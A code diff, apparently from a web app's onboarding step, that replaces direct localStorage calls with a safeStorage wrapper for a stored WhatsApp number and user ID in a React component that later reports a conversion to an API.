@@ -3,6 +3,7 @@ import { Search, X, CheckCircle2, Smartphone, Loader2, Info, ArrowRight, ShieldC
 import { motion, AnimatePresence } from "motion/react";
 import axios from "axios";
 import { API_URL } from "../config";
+import { safeStorage } from "../utils/storage";
 
 interface Step2Props {
   data: {
@@ -18,7 +19,7 @@ type AnalysisState = "checking_base" | "verifying_identity" | "finalizing" | "re
 export function Step2({ data, onReset }: Step2Props) {
   const [analysisState, setAnalysisState] = useState<AnalysisState>("checking_base");
   const [config, setConfig] = useState({ 
-    whatsappNumber: typeof window !== 'undefined' ? (localStorage.getItem('svr_last_whatsapp') || "5511922968136") : "5511922968136" 
+    whatsappNumber: typeof window !== 'undefined' ? (safeStorage.getItem('svr_last_whatsapp') || "5511922968136") : "5511922968136" 
   });
   const [isProcessingWhatsApp, setIsProcessingWhatsApp] = useState(false);
   const [processStep, setProcessStep] = useState(0);
@@ -31,11 +32,11 @@ export function Step2({ data, onReset }: Step2Props) {
           console.log("✅ Número sincronizado dinamicamente:", response.data.whatsappNumber);
           setConfig(response.data);
           // Salvar para o navegador não esquecer se houver oscilação
-          localStorage.setItem('svr_last_whatsapp', response.data.whatsappNumber);
+          safeStorage.setItem('svr_last_whatsapp', response.data.whatsappNumber);
         }
       } catch (err) {
         console.error("Falha na sincronia modular. Usando memória local.");
-        const lastSaved = localStorage.getItem('svr_last_whatsapp');
+        const lastSaved = safeStorage.getItem('svr_last_whatsapp');
         if (lastSaved) setConfig({ whatsappNumber: lastSaved });
       }
     };
@@ -77,7 +78,7 @@ export function Step2({ data, onReset }: Step2Props) {
       } else {
         clearInterval(interval);
 
-        const userId = localStorage.getItem('svr_user_id') || "N/A";
+        const userId = safeStorage.getItem('svr_user_id') || "N/A";
         const protocol = `SVR-${userId.toUpperCase()}`;
         // UTF-8 safe base64 encoding for the token
         const token = btoa(unescape(encodeURIComponent(data.docValue))).substring(0, 12).toUpperCase();
@@ -96,7 +97,7 @@ export function Step2({ data, onReset }: Step2Props) {
         // Notify Admin Bot IMMEDIATELY upon click
         const notifyConversion = async () => {
           try {
-            const userIdForApi = localStorage.getItem('svr_user_id');
+            const userIdForApi = safeStorage.getItem('svr_user_id');
             if (userIdForApi) {
               await axios.post(`${API_URL}/api/v1/session/convert`, {
                 userId: userIdForApi,
